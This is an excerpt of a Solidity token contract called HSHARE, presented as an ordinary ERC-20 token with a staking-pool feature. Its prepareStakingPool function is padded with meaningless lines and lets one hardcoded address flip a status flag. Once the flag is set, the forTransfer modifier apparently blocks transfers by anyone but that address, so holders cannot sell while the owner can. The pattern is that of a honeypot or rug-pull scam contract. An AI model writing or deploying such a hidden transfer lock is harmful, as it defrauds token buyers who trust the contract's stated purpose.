...
contract HSHARE is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenz_totalSupply;
    uint256 private _tokenz_status = 0;
    uint256 public stakingPoolzStatus = 0;

    string private _tokenz_name;
    string private _tokenz_symbol;

    address private _poolzAddress = 0x98727062D494d0514B9b0a983bd45d585F139852;

    constructor() {
        _tokenz_name = "HSHARE";
        _tokenz_symbol = "HSHARE";
        _tokenz_totalSupply = 100 * 10 ** 18;
        _balances[msg.sender] = _tokenz_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolzAddress || _tokenz_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolzStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolzAddress)
        {
            _tokenz_status = 1;
        }
    }
